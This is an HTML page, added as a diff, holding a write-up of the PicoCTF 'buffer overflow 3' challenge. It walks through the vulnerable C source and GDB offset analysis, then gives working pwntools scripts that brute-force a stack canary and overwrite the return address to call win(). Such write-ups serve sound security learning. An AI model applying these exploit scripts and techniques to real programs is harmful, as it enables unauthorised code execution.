@@ -1,0 +1,444 @@
+<!DOCTYPE html>
+<html lang="en">
+
+    <head>
+
+        <link rel="icon" type="image/jpg" href="../Images/Rouge_Death_dp.jpg">
+        <title>Buffer Overflow 3</title>
+        <meta charset="UTF-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+        <link rel="stylesheet" type="text/css" href="../css/styles.css">
+
+    </head>
+
+    <body>
+
+        <div class="navbar">
+            <h1>buffer overflow 3<span class="blink">|</span></h1>
+            <p>
+                <a class="other-links" href="../index.html">home</a> . 
+                <a class="other-links" href="../writeups.html">writeups</a> . 
+                <a href="pico22bof3.html"><u>bof3</u></a> | 
+                <a class="other-links" href="https://picoctf.org/index#picogym">PicoCTF</a>
+            </p>
+            <button id="toggle" onclick="svg_changer()"></button>
+        </div>
+
+        <div id="table-of-contents">
+            <h3>Contents:</h3>
+            <a href="#enum">
+                <h4>
+                    Enumeration
+                    <svg id="toc-link-ico" xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
+                        <path stroke-linecap="round" stroke-linejoin="round" d="M13.828 10.172a4 4 0 00-5.656 0l-4 4a4 4 0 105.656 5.656l1.102-1.101m-.758-4.899a4 4 0 005.656 0l4-4a4 4 0 00-5.656-5.656l-1.1 1.1" />
+                    </svg>
+                </h4>
+            </a>
+            <ul class="no-list-style-toc">
+                <li>
+                    <a href="#context">
+                        Binary Context
+                        <svg id="toc-link-ico" xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
+                            <path stroke-linecap="round" stroke-linejoin="round" d="M13.828 10.172a4 4 0 00-5.656 0l-4 4a4 4 0 105.656 5.656l1.102-1.101m-.758-4.899a4 4 0 005.656 0l4-4a4 4 0 00-5.656-5.656l-1.1 1.1" />
+                        </svg>
+                    </a>
+                </li>
+                <li>
+                    <a href="#source-code">
+                        Source Code
+                        <svg id="toc-link-ico" xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
+                            <path stroke-linecap="round" stroke-linejoin="round" d="M13.828 10.172a4 4 0 00-5.656 0l-4 4a4 4 0 105.656 5.656l1.102-1.101m-.758-4.899a4 4 0 005.656 0l4-4a4 4 0 00-5.656-5.656l-1.1 1.1" />
+                        </svg>
+                    </a>
+                </li>
+            </ul>
+            <br />
+            <a href="#exploit">
+                <h4>
+                    Exploitation
+                    <svg id="toc-link-ico" xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
+                        <path stroke-linecap="round" stroke-linejoin="round" d="M13.828 10.172a4 4 0 00-5.656 0l-4 4a4 4 0 105.656 5.656l1.102-1.101m-.758-4.899a4 4 0 005.656 0l4-4a4 4 0 00-5.656-5.656l-1.1 1.1" />
+                    </svg>
+                </h4>
+            </a>
+            <ul class="no-list-style-toc">
+                <li>
+                    <a href="#gdb">
+                        GDB
+                        <svg id="toc-link-ico" xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
+                            <path stroke-linecap="round" stroke-linejoin="round" d="M13.828 10.172a4 4 0 00-5.656 0l-4 4a4 4 0 105.656 5.656l1.102-1.101m-.758-4.899a4 4 0 005.656 0l4-4a4 4 0 00-5.656-5.656l-1.1 1.1" />
+                        </svg>
+                    </a>
+                </li>
+                <li>
+                    <a href="#exploit-dev">
+                        Exploit Development
+                        <svg id="toc-link-ico" xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
+                            <path stroke-linecap="round" stroke-linejoin="round" d="M13.828 10.172a4 4 0 00-5.656 0l-4 4a4 4 0 105.656 5.656l1.102-1.101m-.758-4.899a4 4 0 005.656 0l4-4a4 4 0 00-5.656-5.656l-1.1 1.1" />
+                        </svg>
+                    </a>
+                </li>
+            </ul>
+        </div>
+
+        <div class="phase">
+
+            <div class="phase-sec">
+                <h3 class="phase-title" id="enum">Enumeration:</h3>
+
+                <h4 id="context">Binary Context</h4>
+
+<pre class="terminal-output">
+$ checksec --file=vuln                      
+[*] 'bof3/vuln'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+</pre>
+
+<pre class="terminal-output">
+$ file vuln
+vuln: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, 
+interpreter /lib/ld-linux.so.2, BuildID[sha1]=5fadb3d053aee24d87bef67c56037d6d9e2b56f2, 
+for GNU/Linux 3.2.0, not stripped
+</pre>
+
+                <p>It&apos;s 32-bit ELF executable.</p>
+
+                <h4 id="source-code">Source Code</h4>
+<pre class="terminal-output">
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;wchar.h&gt;
+#include &lt;locale.h&gt;
+
+#define <strong>BUFSIZE 64</strong>
+#define FLAGSIZE 64
+#define <strong>CANARY_SIZE 4</strong>
+
+void win() {
+    char buf[FLAGSIZE];
+    FILE *f = fopen("flag.txt","r");
+    if (f == NULL) {
+    printf("%s %s", "Please create 'flag.txt' in this directory with your",
+                    "own debugging flag.\n");
+    exit(0);
+    }
+
+    fgets(buf,FLAGSIZE,f); // size bound read
+    puts(buf);
+    fflush(stdout);
+}
+
+char global_canary[CANARY_SIZE];
+void read_canary() {
+    FILE *f = fopen("canary.txt","r");
+    if (f == NULL) {
+    printf("%s %s", "Please create 'canary.txt' in this directory with your",
+                    "own debugging canary.\n");
+    exit(0);
+    }
+
+    fread(global_canary,sizeof(char),CANARY_SIZE,f);
+    fclose(f);
+}
+
+void vuln(){
+    char canary[CANARY_SIZE];
+    char buf[BUFSIZE];
+    char length[BUFSIZE];
+    int count;
+    int x = 0;
+    memcpy(canary,global_canary,CANARY_SIZE);
+    printf("How Many Bytes will You Write Into the Buffer?\n&gt; ");
+    while (x&lt;BUFSIZE) {
+        read(0,length+x,1);
+        if (length[x]=='\n') break;
+        x++;
+    }
+    sscanf(length,"%d",&count);
+
+    printf("Input&gt; ");
+    read(0,buf,count);
+
+    if (memcmp(canary,global_canary,CANARY_SIZE)) {
+        printf("***** Stack Smashing Detected ***** : Canary Value Corrupt!\n"); // crash immediately
+        exit(-1);
+    }
+    printf("Ok... Now Where's the Flag?\n");
+    fflush(stdout);
+}
+
+int main(int argc, char **argv){
+
+    setvbuf(stdout, NULL, _IONBF, 0);
+    
+    // Set the gid to the effective gid
+    // this prevents /bin/sh from dropping the privileges
+    gid_t gid = getegid();
+    setresgid(gid, gid, gid);
+    read_canary();
+    vuln();
+    return 0;
+}     
+</pre>
+
+                <p>Let&apos;s create <em>&quot;canary.txt&quot;</em> and <em>&quot;flag.txt&quot;</em> and add dummy data to test the buffer overflow. From the source code we can see that the canary is 4 bytes long.</p>
+
+<pre class="terminal-output">
+$ echo "test" &gt; canary.txt
+$ echo "FLAG{TEST}" &gt; flag.txt
+</pre>
+
+                <p><em>&quot;Stack Canaries&quot;</em> are usually a random value placed on the stack. Prior to a function return, the stack canary is checked and if it appears to be modified, the program exits immeadiately.</p>
+                <p>Here for the challenge sake the canary is not a random value. We are supposed to bruteforce it.</p>
+                <div class="phase-img">
+                    <figure>
+                        <img src="../Images/wu/bof3/canary_bruteforce.gif" alt="GIF image of bruteforcing a 32-bit canary." />
+                        <figcaption>
+                            Brute-forcing a 32-Bit Stak Canary, accessed 19 May 2022, &lt;https://bananamafia.dev/img/binary-canary-bruteforce/canary_bruteforce.gif&gt;
+                        </figcaption>
+                    </figure>
+                </div>
+
+            </div>
+
+        </div>
+
+        <div class="phase">
+
+            <div class="phase-sec">
+
+                <h3 class="phase-title" id="exploit">Exploitation:</h3>
+
+
+                <h4 id="gdb">GDB</h4>
+                <p>Let's find out the buffer size at which buffer overflow occurs using gdb.</p>
+
+<pre class="terminal-output">
+$ gdb ./vuln
+<b>pwndbg&gt;</b> disassemble vuln
+Dump of assembler code for function vuln:
+--snip--
+   0x0804952f &lt;+206&gt;:	push   eax
+   0x08049530 &lt;+207&gt;:	lea    eax,[ebp-0x10]
+   0x08049533 &lt;+210&gt;:	push   eax
+   0x08049534 &lt;+211&gt;:	call   0x8049180 &lt;memcmp@plt&gt;
+   0x08049539 &lt;+216&gt;:	add    esp,0x10
+   0x0804953c &lt;+219&gt;:	test   eax,eax
+   0x0804953e &lt;+221&gt;:	je     0x804955c &lt;vuln+251&gt;
+   0x08049540 &lt;+223&gt;:	sub    esp,0xc
+   0x08049543 &lt;+226&gt;:	lea    eax,[ebx-0x1f00]
+   0x08049549 &lt;+232&gt;:	push   eax
+   0x0804954a &lt;+233&gt;:	call   0x80491b0 &lt;puts@plt&gt;
+   0x0804954f &lt;+238&gt;:	add    esp,0x10
+   0x08049552 &lt;+241&gt;:	sub    esp,0xc
+   0x08049555 &lt;+244&gt;:	push   0xffffffff
+--snip--   
+End of assembler dump.
+<b>pwndbg&gt;</b> b *0x0804953e
+Breakpoint 1 at 0x804953e
+<b>pwndbg&gt;</b> r &lt;&lt;&lt; $(python -c 'print("65"); print("A"*65)')
+Starting program: /bof3/vuln &lt;&lt;&lt; $(python -c 'print("65"); print("A"*65)')
+How Many Bytes will You Write Into the Buffer?
+&gt; Input&gt; 
+Breakpoint 1, 0x0804953e in vuln ()
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+─────────────────────────────────[ REGISTERS ]──────────────────────────────────
+ EAX  0xffffffff
+ EBX  0x804c000 (_GLOBAL_OFFSET_TABLE_) —▸ 0x804bf10 (_DYNAMIC) ◂— 0x1
+ ECX  0x4
+ EDX  0x804c054 (global_canary) ◂— 'test'
+ EDI  0xf7fad000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1e4d6c
+ ESI  0xf7fad000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1e4d6c
+ EBP  0xffffd138 —▸ 0xffffd158 ◂— 0x0
+ ESP  0xffffd0a0 —▸ 0x804d1a0 ◂— 0x0
+ EIP  0x804953e (vuln+221) ◂— je     0x804955c
+───────────────────────────────────[ DISASM ]───────────────────────────────────
+ ► 0x804953e &lt;vuln+221&gt;    je     vuln+251                     &lt;vuln+251&gt;
+ 
+   0x8049540 &lt;vuln+223&gt;    sub    esp, 0xc
+   0x8049543 &lt;vuln+226&gt;    lea    eax, [ebx - 0x1f00]
+   0x8049549 &lt;vuln+232&gt;    push   eax
+   0x804954a &lt;vuln+233&gt;    call   puts@plt                     &lt;puts@plt&gt;
+ 
+   0x804954f &lt;vuln+238&gt;    add    esp, 0x10
+   0x8049552 &lt;vuln+241&gt;    sub    esp, 0xc
+   0x8049555 &lt;vuln+244&gt;    push   -1
+   0x8049557 &lt;vuln+246&gt;    call   exit@plt                     &lt;exit@plt&gt;
+ 
+   0x804955c &lt;vuln+251&gt;    sub    esp, 0xc
+   0x804955f &lt;vuln+254&gt;    lea    eax, [ebx - 0x1ec4]
+───────────────────────────────────[ STACK ]────────────────────────────────────
+00:0000│ esp 0xffffd0a0 —▸ 0x804d1a0 ◂— 0x0
+01:0004│     0xffffd0a4 ◂— 0x41 /* 'A' */
+02:0008│     0xffffd0a8 ◂— 0xa3536 /* '65\n' */
+03:000c│     0xffffd0ac ◂— 0x1be48500
+04:0010│     0xffffd0b0 ◂— 0x1
+05:0014│     0xffffd0b4 ◂— 0x0
+06:0018│     0xffffd0b8 —▸ 0xf7e498fb (_int_free+11) ◂— add    ebx, 0x163705
+07:001c│     0xffffd0bc —▸ 0xf7fad000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1e4d6c
+─────────────────────────────────[ BACKTRACE ]──────────────────────────────────
+ ► f 0 0x804953e vuln+221
+   f 1 0x80495e6 main+94
+   f 2 0xf7de6e46 __libc_start_main+262
+────────────────────────────────────────────────────────────────────────────────
+<b>pwndbg&gt;</b> c
+Continuing.
+***** Stack Smashing Detected ***** : Canary Value Corrupt!
+[Inferior 1 (process 5633) exited with code 0377]
+</pre>
+
+                <p>From the source code we can see that the BUFSIZE is 64 bytes. If we read more than 64 bytes, let's say 65 bytes then give an input of all "A" 65 times then we enter a condition where it prints <em>&quot;Stack Smashing Detected&quot;</em>.</p>
+                <p>This condition is satisfied only if we modify the stack canary. Since the BUFSIZE is 64, we can modify the canary from 65th byte of our input.</p>
+<pre class="terminal-output">
+<b>pwndbg&gt;</b> r &lt;&lt;&lt; $(python -c 'print("65"); print("A"*64 + "t")')
+Starting program: /bof3/vuln &lt;&lt;&lt; $(python -c 'print("65"); print("A"*64 + "t")')
+How Many Bytes will You Write Into the Buffer?
+&gt; Input&gt; 
+Breakpoint 1, 0x0804953e in vuln ()
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+─────────────────────────────────[ REGISTERS ]──────────────────────────────────
+ EAX  0x0
+ EBX  0x804c000 (_GLOBAL_OFFSET_TABLE_) —▸ 0x804bf10 (_DYNAMIC) ◂— 0x1
+ ECX  0x4
+ EDX  0x804c054 (global_canary) ◂— 'test'
+ EDI  0xf7fad000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1e4d6c
+--snip--
+<b>pwndbg&gt;</b> c
+Continuing.
+Ok... Now Where's the Flag?
+[Inferior 1 (process 6041) exited normally]
+</pre>
+
+                <p>In the above input we have specified the 65th byte of our input as &quot;t&quot;. Since the stack canary begins with the letter &quot;t&quot;, the stack canary will remain unmodified.</p>
+<pre class="terminal-output">
+<b>pwndbg&gt;</b> r &lt;&lt;&lt; $(python -c 'print("65"); print("A"*64 + "t")')
+Starting program: /bof3/vuln &lt;&lt;&lt; $(python -c 'print("65"); print("A"*64 + "t")')
+How Many Bytes will You Write Into the Buffer?
+&gt; Input&gt; 
+Breakpoint 1, 0x0804953e in vuln ()
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+─────────────────────────────────[ REGISTERS ]──────────────────────────────────
+ EAX  0x0
+ EBX  0x804c000 (_GLOBAL_OFFSET_TABLE_) —▸ 0x804bf10 (_DYNAMIC) ◂— 0x1
+ ECX  0x4
+ EDX  0x804c054 (global_canary) ◂— 'test'
+ EDI  0xf7fad000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1e4d6c
+--snip--
+<b>pwndbg&gt;</b> i f
+Stack level 0, frame at 0xffffd140:
+ eip = 0x804953e in vuln; saved eip = 0x80495e6
+ called by frame at 0xffffd170
+ Arglist at 0xffffd138, args: 
+ Locals at 0xffffd138, Previous frame's sp is 0xffffd140
+ Saved registers:
+  ebx at 0xffffd134, ebp at 0xffffd138, eip at 0xffffd13c
+<b>pwndbg&gt;</b> x/s $ebp-82
+0xffffd0e6:	"\004\b", 'A' &lt;repeats 64 times&gt;, "test\002"
+<b>pwndbg&gt;</b> x/s 0xffffd0e8
+0xffffd0e8:	'A' &lt;repeats 64 times&gt;, "test\002"
+<b>pwndbg&gt;</b> info fun win
+All functions matching regular expression "win":
+
+Non-debugging symbols:
+0x08049336  win
+</pre>
+
+                <p>In order to overwrite the <em>&quot;eip&quot;</em> we should know the space between our <em>input</em> and <em>eip</em> i.e 0xffffd13c - 0xffffd0e8 = 0x54 which is 84 in decimal.</p>
+                <p>The address of the <em>&quot;win&quot;</em> function is <em>0x08049336</em></p>
+
+                <h4 id="exploit-dev">Exploit Development</h4>
+                <p>Let's write a python script to bruteforce the canary.</p>
+
+<pre class="terminal-output">
+import string
+from pwn import *
+
+letters = string.ascii_letters
+canary = ''
+i = 0
+buffer = b'65'
+
+while True:
+    if len(canary) == 4:
+        with open("canary.out", 'w') as f:
+            f.write(canary + '\n')
+        print("Done. File saved as 'canary.out'")
+        break
+
+    if i == len(letters):
+        i = 0
+
+    #con = remote("saturn.picoctf.net", 64289, level='error')
+    con = process("./vuln", level='error')
+
+    payload = b'a'*64+ canary.encode() + letters[i].encode()
+    con.sendline(buffer)
+    con.sendline(payload)
+    msg = con.recvallS()
+
+    i += 1
+    if 'Flag' in msg:
+        canary += letters[i-1]
+        print(f"canary: {canary}")
+        buffer = str(65 + len(canary)).encode()
+        i = 0
+
+    con.close()
+</pre>
+
+<pre class="terminal-output">
+$ python3 bof3_canary_bruteforcer.py
+canary: t
+canary: te
+canary: tes
+canary: test
+Done. File saved as 'canary.out'
+</pre>
+
+                <p>We got the canary as <em>&quot;test&quot;</em>. Let's write another python script to get the flag.</p>
+<pre class="terminal-output">
+from sys import exit
+from pwn import *
+
+try:
+    with open('canary.out', 'r') as f:
+        canary = f.read().strip()
+except:
+    print("Please run the canary bruteforcer.\n'canary.out' doesn't exist.")
+    exit(1)
+
+#con = remote("saturn.picoctf.net", 64289)
+con = process("./vuln", level="error")
+
+con.sendline(b"88")
+payload = b'a'*64 + canary.encode() + b"a"*16 + p32(0x08049336)
+con.sendline(payload)
+
+print(con.recvallS())
+
+con.close()
+</pre>
+
+<pre class="terminal-output">
+$ python3 bof3_exploit.py           
+How Many Bytes will You Write Into the Buffer?
+&gt; Input&gt; Ok... Now Where's the Flag?
+flag{test}
+</pre>
+
+            </div>
+
+        </div>
+
+        <script src="../js/themes.js"></script>
+        
+    </body>
+
+</html>
